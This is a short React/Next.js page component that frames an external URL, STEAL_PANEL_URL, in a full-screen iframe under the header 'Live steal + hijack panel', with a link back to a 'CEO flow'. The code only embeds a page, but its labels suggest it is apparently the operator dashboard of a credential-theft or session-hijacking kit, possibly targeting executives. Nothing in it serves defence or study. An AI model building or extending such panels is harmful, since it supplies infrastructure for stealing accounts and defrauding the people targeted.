import { STEAL_PANEL_URL } from "@/lib/config";

export default function PanelPage() {
  return (
    <main style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
      <div
        style={{
          padding: "8px 16px",
          background: "#111",
          color: "#fff",
          fontSize: 13,
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
        }}
      >
        <span>Live steal + hijack panel</span>
        <a href="/ceo" style={{ color: "#00c087" }}>
          ← CEO flow
        </a>
      </div>
      <iframe
        title="Steal panel"
        src={STEAL_PANEL_URL}
        style={{ flex: 1, border: 0, width: "100%" }}
      />
    </main>
  );
}
